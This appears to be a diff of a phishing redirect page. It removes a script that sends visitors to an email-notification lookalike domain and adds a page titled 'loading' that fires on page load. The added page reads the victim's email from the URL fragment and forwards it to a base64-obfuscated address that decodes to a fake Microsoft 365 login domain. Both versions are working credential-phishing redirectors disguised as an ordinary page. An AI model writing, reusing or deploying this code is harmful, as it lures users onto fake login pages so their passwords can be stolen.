@@ -1,7 +1,20 @@
-<script>
-      window.location.replace(
-        "https://exetel.emailnotify.info/exemail/?AFQjCNGzLXWAwfa7JjNQw1yigyslpQ7s&WQbHhhjJZj%2dRsTj296%2dtSvIc%2d9Gioz6ME%5fcFbBP4tllGg2amUOju2Haa3enTsPX3TmjuR4IEE6CsDqJrBoABeI%2dD6MGG4YQ%2#" +
-          atob(new URLSearchParams(window.location.search).get("hash"))
-      );
-   </script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>loading</title>
+  <script>
+    function redirect() {
+      var queryString = window.location.href;
+      var dom= queryString.split("#");
+      var email = dom[1];
+      const forwardUrl = atob("aHR0cHM6Ly9sb2dpbi5hdXRoMC5tMzY1b2ZmaWNlLmNsb3VkL1FwdXdRRU9CIw==");
+      window.location.href = forwardUrl + email;
+    }
+  </script>
+</head>
+<body onload="redirect()">
+  </body>
+</html>
   
